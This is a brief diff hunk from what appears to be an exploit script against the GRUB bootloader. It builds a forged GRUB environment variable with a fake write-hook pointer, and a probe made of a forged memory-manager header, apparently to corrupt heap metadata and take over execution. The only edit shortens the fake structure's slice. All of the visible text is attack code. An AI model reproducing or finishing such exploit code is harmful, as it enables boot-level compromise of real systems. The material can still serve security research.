@@ -119,7 +119,7 @@ def clashgpt(basepath):
     with open(f'{basepath}/e.dat', 'wb') as f:
         f.write(envblock)
 
-    fakeenv = grub_env_var(write_hook=0x30303030)[:8*7]
+    fakeenv = grub_env_var(write_hook=0x30303030)[:8*5]
     teststr = 'Y' * (len(fakeenv) - 1)
     probe_b = grub_mm_header_t(3)
     probe_b += bytes(teststr, 'ascii') + b'\x00'
